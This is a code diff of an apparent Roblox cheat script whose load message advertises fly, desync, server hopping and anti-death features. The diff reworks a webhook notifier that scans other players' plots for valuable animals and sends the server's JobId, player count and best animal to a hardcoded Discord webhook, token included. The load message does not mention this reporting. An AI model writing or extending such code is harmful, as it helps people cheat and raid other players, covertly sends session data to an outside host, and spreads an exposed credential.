@@ -1286,8 +1286,6 @@ end
 
 -- ========== DISCORD WEBHOOK NOTIFIER ==========
 
--- ========== DISCORD WEBHOOK NOTIFIER ==========
-
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1431391715175956491/ho4G8cdYMUUGzfeeocrtwbOkZ4NmKZmpTj1HuqIjCQ-Av2-K-7zZ222YzOIQt6GM-E_A"
 
 -- Function to send Discord webhook
@@ -1296,8 +1294,29 @@ local function sendRealAnimalWebhook()
     local jobId = game.JobId
     local playersCount = #game.Players:GetPlayers()
     
-    -- Use the EXISTING functions from above (remove the duplicate functions below)
-    local overheads = findAnimalOverheads()
+    -- Create a version without cooldown for webhook
+    local function findAnimalsForWebhook()
+        local overheads = {}
+        local plotsFolder = Workspace:FindFirstChild("Plots")
+        if not plotsFolder then return {} end
+
+        for _, plot in pairs(plotsFolder:GetDescendants()) do
+            if plot.Name == "AnimalOverhead" and plot:IsA("BillboardGui") then
+                local stolenLabel = plot:FindFirstChild("Stolen")
+                local isStolen = stolenLabel and stolenLabel:IsA("TextLabel") and string.upper(stolenLabel.Text) == "FUSING"
+                local displayNameLabel = plot:FindFirstChild("DisplayName")
+                local genLabel = plot:FindFirstChild("Generation")
+                local rarityLabel = plot:FindFirstChild("Rarity")
+                if displayNameLabel and genLabel and rarityLabel and not isStolen then
+                    table.insert(overheads, plot)
+                end
+            end
+        end
+        return overheads
+    end
+    
+    -- Use the webhook-specific function (no cooldown)
+    local overheads = findAnimalsForWebhook()
     if #overheads == 0 then return end
     
     -- Find the highest value animal
@@ -1407,7 +1426,8 @@ local function sendRealAnimalWebhook()
     end)
 end
 
--- Send webhook once
+-- Send webhook once with a small delay to ensure animals are loaded
+task.wait(2)
 sendRealAnimalWebhook()
 -- ========== INPUT HANDLERS ==========
 
@@ -1566,6 +1586,7 @@ end)
 
 -- Final initialization message
 showNotification("Script Loaded", "All features activated successfully!\nF: Toggle Fly\nZ: Fly to Best Animal\nG: Mobile Desync\nP: Load Server Hopper\nL: Auto Lazer Cap\nSpace: Anti-Death Jump\nAnti-Negative Effects: Active\nSentry Resizer: Active")
+
 
 
 
